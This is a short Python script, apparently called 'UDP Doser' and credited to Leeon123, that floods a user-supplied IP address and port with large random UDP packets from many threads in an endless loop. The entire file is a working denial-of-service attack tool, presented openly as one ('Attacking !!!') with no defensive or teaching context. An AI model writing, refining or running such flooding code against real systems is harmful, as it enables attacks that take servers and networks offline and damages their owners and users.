#!/usr/bin/python3
#Code by Leeon123

import threading
import socket
import random
import time

print ('''
 _   _ ____  ____    ____                      
| | | |  _ \|  _ \  |  _ \  ___  ___  ___ _ __ 
| | | | | | | |_) | | | | |/ _ \/ __|/ _ \ '__|
| |_| | |_| |  __/  | |_| | (_) \__ \  __/ |   
 \___/|____/|_|     |____/ \___/|___/\___|_|                                              
[!]Python3 version               Code By Leeon123 
================================================''')
time.sleep(0.5)
ip = str(input("Url/ip:"))
port = int(input("Port:"))
thread_num = int(input("Threads:"))
times = int(input("Packets for a thread:"))
print ("Attacking !!! Thread:",thread_num)

def run():
	bytes = random._urandom(65000)
	while True:
		try:
			print("[!]Try to build a new thread")
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			sendAddr=(str(ip),int(port))
			for y in range(times):
				s.sendto(bytes, sendAddr)
			print ("[*]UDP sent!")
			s.close
		except:
			s.close()
			print ("[!]Error, socket close")
			
for i in range(thread_num):
    th = threading.Thread(target = run)
    th.start()
